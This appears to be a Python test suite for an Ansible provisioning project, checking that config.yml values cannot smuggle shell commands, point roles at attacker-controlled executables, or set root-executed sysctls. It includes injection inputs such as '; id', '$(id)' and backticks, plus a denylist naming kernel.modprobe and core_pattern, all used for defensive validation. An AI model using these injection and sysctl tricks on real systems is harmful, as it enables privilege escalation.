    def test_container_play_without_play_0_fails_closed(self):
        with tempfile.TemporaryDirectory() as directory:
            project = Project(directory)
            result = self.container_run(project, [self.play3(project)])
            self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
            self.assertIn('has no config.yml checked on localhost', result.stdout)

    def test_container_play_validates_the_distrobox_values_it_uses(self):
        """site.yml's Play 3 runs the distrobox validators before anything runs in the container."""
        play3 = next(play for play in yaml.safe_load((ROOT / 'site.yml').read_text()) if play.get('hosts') == 'containers')
        names = [task.get('name', '') for task in play3['pre_tasks']]
        validate = names.index('SECURITY validate the distrobox values this play provisions with')
        self.assertGreater(validate, names.index('SECURITY CRITICAL — Validate config integrity before container provisioning'))
        self.assertLess(validate, names.index('Bootstrap Python inside container'))
        self.assertTrue(play3['pre_tasks'][validate]['ansible.builtin.include_tasks'].endswith(
            '/roles/distrobox/tasks/validate-provision.yml'))
        self.assertNotIn('tags', play3['pre_tasks'][validate])

    def test_facts_set_before_the_config_load_are_refused(self):
        """set_fact ties go to the last writer: a fact set before the load must not be settable from config.yml."""
        before = []
        play0 = yaml.safe_load((ROOT / 'pre-flight.yml').read_text())[0]['tasks']
        before += play0[:[task.get('name') for task in play0].index('Run early pre-flight checks (before any role execution)')]
        play3 = next(play for play in yaml.safe_load((ROOT / 'site.yml').read_text()) if play.get('hosts') == 'containers')
        pre = play3['pre_tasks']
        before += pre[:[task.get('name', '') for task in pre].index(
            'SECURITY CRITICAL — Validate config integrity before container provisioning')]
        names = set()
        for task in before:
            names.update([task['register']] if 'register' in task else [])
            names.update(task.get('ansible.builtin.set_fact') or {})
        self.assertIn('real_user_home', names)
        for name in sorted(names):
            with self.subTest(name=name):
                self.assertTrue(parser.policy_violations({name: 'x'}), name)

    def test_racing_config_writes_never_reach_the_interpreter(self):
        """A same-user racer flips config.yml and any *config.yml in TMPDIR while the guard runs; nothing loads it."""
        import threading
        with tempfile.TemporaryDirectory() as directory, tempfile.TemporaryDirectory() as tmpdir:
            project = Project(directory)
            source, checked = project.root / 'config.yml', 'probe_source: checked\n'
            stop, swaps, seen = threading.Event(), [], {}

            def race():
                flip = 0
                while not stop.is_set():
                    flip ^= 1
                    staged = project.root / '.staged'
                    staged.write_text(checked + (project.evil if flip else ''))
                    os.replace(staged, source)
                    for copy in Path(tmpdir).glob('*config.yml'):  # the private copy an older load used
                        try:
                            good = seen.setdefault(copy, copy.read_text())
                            for content in (good + project.evil, good):  # flip so a later hash can match
                                staged_copy = copy.with_name(copy.name + '.rv')
                                staged_copy.write_text(content)
                                os.replace(staged_copy, copy)
                            swaps.append(copy)
                        except OSError:
                            pass
                    stop.wait(0.001)
            racer = threading.Thread(target=race)
            racer.start()
            outcomes = []
            try:
                for _ in range(20):
                    result = project.run_probe(env={'TMPDIR': tmpdir})
                    self.assertFalse(project.marker.exists(), result.stdout + result.stderr)
                    self.assertIn(result.returncode, (0, 2), result.stdout + result.stderr)
                    outcomes.append(result.returncode)
                    if result.returncode == 0:
                        self.assertIn('PROBE=checked', result.stdout)
            finally:
                stop.set()
                racer.join()
            self.assertEqual(len(set(swaps)), 0, 'config.yml copies were written to TMPDIR')  # nothing to swap


GUARD_FILES = ['common/tasks/config_ssti_guard.yml', 'common/tasks/pre_flight_checks.yml',
               'roles/distrobox/tasks/validate-provision.yml']


# config key -> (value written to config.yml, path a role would then run); FAKE is a user-writable directory
EXECUTABLE_KEYS = {
    'notes_transcrypt_bin_path': ('FAKE/transcrypt', 'FAKE/transcrypt'),
    'notes_transcrypt_linux_bin_path': ('FAKE/transcrypt', 'FAKE/transcrypt'),
    'containers_podman_bin': ('FAKE/podman', 'FAKE/podman'),
    'containers_macos_machine_ensure_script': ('FAKE/ensure', 'FAKE/ensure'),
    'claude_bin_path': ('FAKE/claude', 'FAKE/claude'),
    'claude_queue_poller_path': ('FAKE/poller', 'FAKE/poller'),
    'codex_npm_prefix': ('FAKE', 'FAKE/bin/codex'),
    'antigravity_bin_dir': ('FAKE', 'FAKE/agy'),
    'dotfiles_homebrew_prefix': ('FAKE', 'FAKE/bin/gh'),
    'desktop_sway_polkit_agent': ('FAKE/polkit-agent', 'FAKE/polkit-agent'),
    'desktop_i3_polkit_agent': ('FAKE/lxpolkit', 'FAKE/lxpolkit'),
}


class ExecutablePathTests(unittest.TestCase):
    """config.yml cannot point a role at an executable of its choosing (SECURITY.md, "Executable paths")."""

    def violations(self, key, value):
        return parser.policy_violations({key: value})

    def test_fixed_locations_are_refused(self):
        for key in sorted(parser.FIXED_EXECUTABLE_KEYS):
            with self.subTest(key=key):
                self.assertTrue(self.violations(key, '/usr/local/bin/x'))

    def test_allowlisted_locations(self):
        cases = {
            'dotfiles_homebrew_prefix': (['/opt/homebrew', '/usr/local'],
                                         ['/opt/homebrew/', '/home/user/brew', '/usr/local/../tmp', '', 7]),
            'desktop_sway_polkit_agent': (
                ['/usr/libexec/lxqt-policykit-agent', '/usr/bin/lxqt-policykit-agent', '/usr/bin/lxpolkit',
                 '/usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1',
                 '/usr/lib/x86_64-linux-gnu/libexec/polkit-kde-authentication-agent-1',
                 '/usr/libexec/kf6/polkit-kde-authentication-agent-1', '/usr/libexec/soteria', '/usr/bin/cosmic-osd'],
                ['/home/user/polkit-agent', '/usr/bin/../../home/user/polkit', '/usr/libexec/../../home/u/x',
                 '/usr/lib/./polkit', 'lxpolkit', '/usr/bin/lxpolkit --debug', '/usr/bin/lxpolkit;id', '/tmp/polkit',
                 '/usr/bin/sub/agent', '/usr/local/bin/polkit-agent']),
            'acli_site': (['redhat.atlassian.net', 'my-team.atlassian.net', ''],
                          ['evil.example', 'redhat.atlassian.net.evil.example', 'https://redhat.atlassian.net',
                           'Redhat.atlassian.net', '-x.atlassian.net', 'atlassian.net', None]),
            'dotfiles_macos_python': (['python@3.14', 'python@3.13', 'python'],
                                      ['python@3.14$(id)', 'python 3', '../x', 'python@3.14"', '`id`', '']),
            # /etc/locale.conf is evaluated by /etc/profile.d/lang.sh in root login shells
            'system_locale': (['en_US.UTF-8', 'de_DE.UTF-8@euro', 'sr_RS@latin', 'en_US.utf8', 'en_US', 'ast_ES.UTF-8',
                               'C', 'C.UTF-8', 'C.utf8', 'POSIX'],
                              ['en_US.UTF-8; id -un > /tmp/x', 'en_US.UTF-8$(id)', 'en_US.UTF-8`id`', 'en_US.UTF-8"',
                               "en_US.UTF-8'", 'en US', 'en_us.UTF-8', '', 'C;id', 7]),
            'system_keymap': (['us', 'de-latin1', 'dvorak', 'en_US'], ['us; id', 'us$(id)', 'us x', '']),
            'system_tlp_platform_profile_ac': (['performance', 'balanced', 'low-power'], ['performance; id', 'fast', '']),
            'system_tlp_cpu_energy_policy_bat': (['balance_power', 'power', 'default'], ['power$(id)', 'eco']),
        }
        cases['desktop_i3_polkit_agent'] = cases['desktop_sway_polkit_agent']
        for key, (allowed, refused) in cases.items():
            for value in allowed:
                with self.subTest(key=key, value=value):
                    self.assertEqual(self.violations(key, value), [])
            for value in refused:
                with self.subTest(key=key, value=value):
                    self.assertTrue(self.violations(key, value))
        # the defaults the roles compute pass
        self.assertEqual(self.violations('desktop_i3_polkit_agent', '/usr/bin/lxpolkit'), [])

    def test_sysctls_the_kernel_runs_are_refused(self):
        """kernel.modprobe and friends name a program the kernel runs as root on an unprivileged request."""
        refused = ['kernel.modprobe', '-kernel.modprobe', 'kernel/modprobe', 'kernel.poweroff_cmd', 'kernel.reboot_cmd',
                   'kernel.core_pattern', 'kernel.hotplug', 'kernel.usermodehelper.bset', 'kernel.usermodehelper.inheritable',
                   'fs.binfmt_misc.register', 'fs.binfmt_misc.status']
        for key in ('system_sysctl_extra', 'system_sysctl_extra_additional'):
            for name in refused:
                with self.subTest(key=key, name=name):
                    self.assertTrue(self.violations(key, {name: '/home/user/.local/bin/x'}))
            # other spellings systemd-sysctl or procps reduce to the same /proc/sys file, or malformed keys
            for name in ['kernel..modprobe', '.kernel.modprobe', 'kernel.modprobe.', '-.kernel.modprobe',
                         'kernel..core_pattern', 'fs..binfmt_misc.register', '--kernel.modprobe', 'kernel//modprobe',
                         'Kernel.modprobe', 'kernel.modprobe ', 'kernel.*', '']:
                with self.subTest(key=key, name=name):
                    self.assertTrue(self.violations(key, {name: '/home/user/.local/bin/x'}))
            for name in ['vm.swappiness', 'kernel.modprobe_extra', 'net.core.rmem_max', 'fs.inotify.max_user_watches',
                         '-vm.swappiness', 'net.bridge.bridge-nf-call-iptables']:
                with self.subTest(key=key, name=name):
                    self.assertEqual(self.violations(key, {name: '1'}), [])

    def test_sysctl_denylist_matches_the_role(self):
        task = yaml.safe_load((ROOT / 'roles/system/tasks/main.yml').read_text())
        validator = next(item for item in task if 'Validate sysctl key and value format' in item.get('name', ''))
        self.assertEqual(validator['vars']['_sysctl_exec_re'], '^' + parser.SYSCTL_EXEC_KEYS.pattern + '\\Z')
        self.assertEqual(validator['vars']['_sysctl_key_re'], '^' + parser.SYSCTL_KEY.pattern + '\\Z')

    def test_sysctl_names_are_normalized_like_systemd_sysctl(self):
        for key, name in [('kernel..modprobe', 'kernel.modprobe'), ('.kernel.modprobe.', 'kernel.modprobe'),
                          ('-kernel/modprobe', 'kernel.modprobe'), ('--.fs..binfmt_misc..register.', 'fs.binfmt_misc.register')]:
            with self.subTest(key=key):
                self.assertEqual(parser.sysctl_name(key), name)

    def test_tlp_lists_match_the_role(self):
        tasks = yaml.safe_load((ROOT / 'roles/system/tasks/power_management.yml').read_text())
        found = []

        def walk(items):
            for task in items or []:
                if task.get('name', '').startswith('SECURITY assert the TLP profile values'):
                    found.append(task)
                for key in ('block', 'rescue', 'always'):
                    walk(task.get(key))
        walk(tasks)
        self.assertEqual(len(found), 1)
        self.assertEqual(tuple(found[0]['vars']['_system_tlp_platform_profiles']), parser.PLATFORM_PROFILE_CHOICES)
        self.assertEqual(tuple(found[0]['vars']['_system_tlp_energy_policies']), parser.ENERGY_PERF_POLICIES)

    def test_every_executable_key_is_covered(self):
        self.assertEqual(set(EXECUTABLE_KEYS), set(parser.FIXED_EXECUTABLE_KEYS) | set(parser.ALLOWED_EXECUTABLE_VALUES))

    def test_a_fake_binary_in_config_never_runs(self):
        """Each key set to a user-writable fake binary is refused before anything can run it."""
        for key, (value, executed) in sorted(EXECUTABLE_KEYS.items()):
            self.assertTrue(executed.startswith(value))
            with self.subTest(key=key), tempfile.TemporaryDirectory() as directory:
                fake = Path(directory) / 'fake'
                marker = Path(directory) / 'ran'
                target = Path(executed.replace('FAKE', str(fake)))
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text('#!/bin/sh\ntouch ' + str(marker) + '\n')
                target.chmod(0o755)
                project = Project(directory, config='%s: %s\n' % (key, json.dumps(value.replace('FAKE', str(fake)))))
                result = project.run([{'hosts': 'localhost', 'gather_facts': False,
                                       'vars': {'common_project_root': str(project.root)},
                                       'tasks': project.load + [{'name': 'Run it as a role would', 'ansible.builtin.command': {
                                           'argv': ['{{ %s }}' % key + executed[len(value):]]}}]}])
                self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
                self.assertIn('Fail when config.yml sets keys or characters that change execution', result.stdout)
                self.assertFalse(marker.exists())


def guard_variables():
    """Every variable the guard files register, set_fact or define as task/block vars or loop vars."""
    names = set()

    def walk(tasks):
        for task in tasks or []:
            names.update([task['register']] if 'register' in task else [])
            facts = task.get('ansible.builtin.set_fact') or task.get('set_fact') or {}
            names.update(key for key in facts if key != 'cacheable')
            names.update(task.get('vars') or {})
            names.update([task['loop_control']['loop_var']] if 'loop_var' in task.get('loop_control', {}) else [])
            for key in ('block', 'rescue', 'always'):
                walk(task.get(key))
    for path in GUARD_FILES:
        walk(yaml.safe_load((ROOT / path).read_text()))
    return names


class GuardVariableTests(unittest.TestCase):
    def test_every_guard_variable_is_protected_from_extra_vars(self):
        """-e outranks register and set_fact: an unprotected guard variable lets -e skip the guard."""
        protected = parser.protected_keys_pattern()
        names = guard_variables()
        self.assertIn('_pf_config_raw', names)
        for name in sorted(names):
            with self.subTest(name=name):
                # the wrapper searches every -e value, in both key=value and JSON form
                self.assertRegex(name + '=1', protected)
                self.assertRegex(json.dumps({name: {}}), protected)

    def test_every_assertion_result_var_is_protected_from_extra_vars(self):
        """An assert or fail task's vars: hold its computed result; -e outranks task vars, so -e must not set them."""
        protected = parser.protected_keys_pattern()
        files = ['site.yml', 'pre-flight.yml'] + sorted(str(path.relative_to(ROOT)) for pattern in
                                                       ('roles/*/tasks/*.yml', 'common/tasks/*.yml')
                                                       for path in ROOT.glob(pattern))
        found = set()

        def walk(tasks, path):
            for task in tasks if isinstance(tasks, list) else []:
                if not isinstance(task, dict):
                    continue
                for key in ('tasks', 'pre_tasks', 'post_tasks', 'block', 'rescue', 'always'):
                    walk(task.get(key), path)
                if any(module in task for module in ('ansible.builtin.assert', 'ansible.builtin.fail')):
                    found.update((path, name) for name in task.get('vars') or {})
        for path in files:
            walk(yaml.safe_load((ROOT / path).read_text()), path)
        self.assertIn(('roles/distrobox/tasks/validate-provision.yml', '_pf_unlisted_exec'), found)
        for path, name in sorted(found):
            with self.subTest(path=path, name=name):
                self.assertRegex(name + '=1', protected)
                self.assertRegex(json.dumps({name: []}), protected)

    def test_undecodable_input_reports_the_error_type_only(self):
        result = subprocess.run([sys.executable, str(ROOT / 'scripts/parse-config.py')],
                                input=b'value: "\xff\xfe internal-secret-host"\n', capture_output=True, timeout=60)
        self.assertEqual(result.returncode, 1)
        self.assertEqual(result.stderr.decode(), 'Cannot parse config.yml: UnicodeDecodeError\n')


if __name__ == "__main__":
    unittest.main()
